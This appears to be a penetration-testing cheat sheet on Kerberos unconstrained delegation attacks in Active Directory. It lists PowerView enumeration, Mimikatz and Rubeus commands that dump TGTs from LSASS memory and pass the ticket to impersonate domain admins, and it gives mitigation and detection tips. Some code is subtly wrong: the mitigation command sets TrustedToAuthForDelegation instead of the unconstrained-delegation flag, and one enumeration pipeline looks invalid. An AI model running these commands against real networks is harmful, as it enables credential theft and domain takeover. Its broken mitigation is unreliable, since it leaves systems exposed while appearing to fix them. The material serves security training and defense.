# **Unconstrained Delegation Attack (Kerberos)**

## **Understanding Unconstrained Delegation**

- **Unconstrained Delegation** allows a service in Active Directory (AD) to impersonate **any user** to access network resources.
- When a user authenticates to a service with **unconstrained delegation enabled**, the user's **TGT (Ticket Granting Ticket)** is stored in memory.
- Attackers who compromise the server can extract this TGT and use it to impersonate users (including **domain admins**).

---

## **How Unconstrained Delegation Works**

1. **Delegation Basics:**

   - Delegation allows services to impersonate users and access resources on their behalf.
   - **Unconstrained Delegation** is a legacy form that grants **broad access** to the delegated service.

2. **Vulnerability:**

   - Any service marked with **unconstrained delegation** can request and keep users' TGTs.
   - Attackers can extract these TGTs from memory and perform **pass-the-ticket (PTT)** attacks.

3. **Key Attack Vectors:**
   - **Compromise a machine with unconstrained delegation enabled.**
   - **Dump TGTs from LSASS.**
   - **Impersonate high-privileged users.**

---

## **Tools and Techniques**

### **Identify Unconstrained Delegation (PowerView):**

- Use PowerView to find machines with unconstrained delegation enabled:
  ```powershell
  Get-DomainComputer -Unconstrained
  ```

---

### **Mimikatz (Extract TGTs):**

- **Dump TGTs from LSASS (Memory):**

  ```powershell
  mimikatz.exe
  privilege::debug
  sekurlsa::tickets /export
  ```

  - **Exported TGTs** can be reused to access services as the impersonated user.

- **Pass the Ticket (Impersonate User):**
  ```powershell
  mimikatz.exe
  kerberos::ptt <ticket.kirbi>
  ```

---

### **Rubeus (Ticket Extraction):**

- **Extract Tickets from Memory:**

  ```powershell
  Rubeus.exe dump
  ```

- **Inject Ticket:**
  ```powershell
  Rubeus.exe ptt /ticket:<TGT.kirbi>
  ```

---

## **Example Attack Workflow (Unconstrained Delegation):**

1. **Identify Targets:**

   ```powershell
   Get-DomainComputer -Unconstrained
   ```

2. **Compromise the Target (Lateral Movement):**

   - Gain control of a machine with unconstrained delegation enabled.

3. **Dump TGTs from Memory:**

   ```powershell
   mimikatz.exe
   sekurlsa::tickets /export
   ```

4. **Use the TGT to Impersonate Users:**

   ```powershell
   kerberos::ptt <ticket.kirbi>
   ```

5. **Access Resources as Target User:**
   - Access privileged resources or pivot to domain controllers.

---

## **Detection and Mitigation**

### **Mitigation Techniques:**

1. **Limit Unconstrained Delegation:**

   - Disable **unconstrained delegation** wherever possible.
   - Use **constrained delegation** or **resource-based delegation** as safer alternatives.

2. **Protect High-Privilege Accounts:**

   - Prevent **domain admin** accounts from authenticating to machines with unconstrained delegation.

3. **Service Account Restrictions:**
   ```powershell
   Set-ADComputer -Identity <ServerName> -TrustedToAuthForDelegation $False
   ```

---

### **Detection Techniques:**

- **Monitor Event Logs:**

  - **Event ID 4769** – Kerberos TGS requests.
  - Look for abnormal TGS requests to machines with delegation enabled.

- **Analyze Network Traffic:**
  - Detect users authenticating to unconstrained delegation hosts.

---

## **Testing for Vulnerable Machines**

- **Find Delegation Permissions:**

  ```powershell
  Get-ADComputer -Filter {TrustedForDelegation -eq $True}
  ```

- **Check High-Privilege Delegation:**
  ```powershell
  Get-DomainUser -AdminCount 1 | Get-DomainObject -Unconstrained
  ```

---

## **Real-World Impact:**

- **Privilege Escalation:**
  - Compromising machines with unconstrained delegation can lead to **domain dominance**.
- **Persistence:**
  - Attackers can maintain access by continually extracting TGTs from delegated machines.
- **Lateral Movement:**
  - TGTs allow easy access to other network services as the impersonated user.

---

## **Example Scenario (Full):**

1. **Identify Unconstrained Hosts:**

   ```powershell
   Get-DomainComputer -Unconstrained
   ```

2. **Compromise the Host:**

   - Lateral movement using **Pass-the-Hash (PTH)** or **exploits**.

3. **Extract TGTs with Mimikatz:**

   ```powershell
   sekurlsa::tickets /export
   ```

4. **Reuse TGT to Access Resources:**
   ```powershell
   kerberos::ptt <admin_ticket.kirbi>
   ```

---

## **⚠️Disclaimer⚠️**

This guide is for **educational purposes only**. Unauthorized exploitation of Kerberos or delegation misconfigurations is illegal and unethical. Always conduct penetration tests with proper authorization.
